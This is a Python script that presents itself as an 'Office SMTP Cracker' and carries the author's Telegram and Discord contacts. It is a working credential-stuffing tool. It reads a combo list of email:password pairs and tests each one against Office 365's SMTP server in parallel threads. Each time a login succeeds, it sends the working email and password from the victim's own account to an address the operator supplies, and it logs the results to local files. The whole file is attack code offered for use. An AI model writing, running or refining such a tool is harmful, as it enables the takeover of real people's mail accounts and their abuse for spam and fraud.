# -*- coding: utf-8 -*-
import smtplib
import datetime
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

wolf_ascii = u"""
██████╗  █████╗ ██╗  ██╗███████╗██████╗ 
██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
██████╔╝███████║█████╔╝ █████╗  ██████╔╝
██╔══██╗██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗
██████╔╝██║  ██║██║  ██╗███████╗██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ Office SMTP Cracker By https://t.me/BAK34_TMW / Discord: https://discord.com/users/825505380452925470
"""

def work(user, pwd):
    print(u"LIVE => " + user + u":" + pwd)
    with open("LIVE-BAK3R.txt", "a+", encoding="utf-8") as f:
        f.write(u"LIVE => " + user + u":" + pwd + u"\n")

def bad(user, pwd):
    print(u"BAD => " + user + u":" + pwd)
    with open("BAD-BAK3R.txt", "a+", encoding="utf-8") as f:
        f.write(u"BAD => " + user + u":" + pwd + u"\n")

def checker(data, email_address):
    try:
        data = data.split(u":")
        if len(data) != 2:
            raise ValueError(u"Invalid data format, expected 'user:password'")
        user = data[0].strip()
        pwd = data[1].strip()

        mailserver = smtplib.SMTP('smtp.office365.com', 587)
        mailserver.ehlo()
        mailserver.starttls()
        mailserver.login(user, pwd)
        subj = u"Rez SMTP Info"
        date = datetime.datetime.now().strftime("%d/%m/%Y %H:%M")
        from_addr = user
        to_addr = email_address
        message_text = (
            u"+++++++++ |   BAKER   | +++++++++\n"
            u"[+] E-mail : " + user + u"\n"
            u"[+] E-mail Password : " + pwd + u"\n"
            u"[+] Host : smtp.office365.com\n"
            u"[+] Port : 587\n"
            u"+++++++++ |   BAKER   | +++++++++"
        )

        msg = u"From: {}\nTo: {}\nSubject: {}\nDate: {}\n\n{}".format(from_addr, to_addr, subj, date, message_text)
        mailserver.sendmail(from_addr, to_addr, msg.encode("utf-8"))
        mailserver.quit()
        work(user, pwd)
    except Exception as e:
        bad(user, pwd)
        print(u"Failed to send email for {}: {}".format(user, e))

if __name__ == "__main__":
    print(wolf_ascii)
    print("remove any links from the combo, only email:pass\n")

    # Check Python version and use appropriate input function
    if sys.version_info[0] < 3:
        input_function = raw_input
    else:
        input_function = input

    email_address = input_function("Enter your email address: ")  # Prompt user for their email address
    file_name = input_function("Enter Your combo Name: ")  # Prompt user for combo file

    try:
        with open(file_name, 'r', encoding='utf-8', errors='ignore') as file:
            TEXTList = file.read().splitlines()

        # Use ThreadPoolExecutor for parallel processing
        with ThreadPoolExecutor(max_workers=25) as executor:
            futures = [executor.submit(checker, line, email_address) for line in TEXTList]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as exc:
                    print(u"Generated an exception: {}".format(exc))
    except Exception as e:
        print("Failed to make process:", str(e))

    input_function("Press Enter to exit...")
